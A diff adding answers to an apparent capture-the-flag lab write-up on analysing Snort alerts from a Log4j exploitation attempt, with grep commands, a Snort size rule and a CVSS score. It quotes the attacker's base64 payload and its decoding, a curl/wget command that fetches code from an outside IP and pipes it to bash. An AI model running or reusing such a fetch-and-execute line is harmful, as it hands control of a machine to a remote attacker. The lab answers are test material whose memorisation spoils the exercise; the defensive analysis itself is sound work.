@@ -107,3 +107,22 @@ unfinished 2022/04
    * all used sids are 8 digits, thus we can just cat, grep, sort
    * cat alert | egrep -o '\\[1\\:[0-9]{8}\\:1\\]' | sort | uniq
    * -> 4
+3. `first 6 digits of triggered rules`
+   * use command from 8.2.
+   * -> 210037
+4. `write rule to filter payload between 770 and 855 bytes`
+   * alert tcp any any -> any any (msg:"Size 770-855b"; dsize: 770<>855;sid:1000001; rev:1;)
+   * -> 41
+5. `encoding algorithm used`
+   * if you cat all ASCII logs you will find utf-8 which is wrong, but also /Basic/Command/Base64/KGN1cmwgLX... which looks base64
+   * it also makes sense in the context of log4j. As in which encoding was used to hide the payload when exploiting log4j
+   * -> base64
+6. `IP ID of the corresponding packet`
+   * on the package you found in 8.5 scroll up and look for 'ID=' in the TCP header
+7. `attackers command`
+   * copy the base64 string, remove the hex representation if needed and convert using your favorite tool (e.g. cyberchef)
+   * KGN1cmwgLXMgNDUuMTU1LjIwNS4yMzM6NTg3NC8xNjIuMC4yMjguMjUzOjgwfHx3Z2V0IC1xIC1PLSA0NS4xNTUuMjA1LjIzMzo1ODc0LzE2Mi4wLjIyOC4yNTM6ODApfGJhc2g=
+   *-> (curl -s 45.155.205.233:5874/162.0.228.253:80\|\|wget -q -O- 45.155.205.233:5874/162.0.228.253:80)\|bash
+8. `CVSS v2 score of log4j`
+   * https://nvd.nist.gov/vuln/detail/CVE-2021-44228
+   * -> 9.3
